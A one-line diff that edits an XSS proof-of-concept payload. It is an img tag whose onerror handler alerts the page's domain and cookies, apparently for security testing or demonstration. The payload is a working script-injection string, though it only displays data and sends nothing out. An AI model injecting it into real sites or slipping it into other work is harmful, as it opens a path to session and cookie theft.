@@ -1,1 +1,1 @@
-<img src=x onerror="alert(document.domain + '\n' + document.cookie)">
+<img src=x onerror="alert('XSS on '+document.domain+'\ncookies: '+document.cookie)">
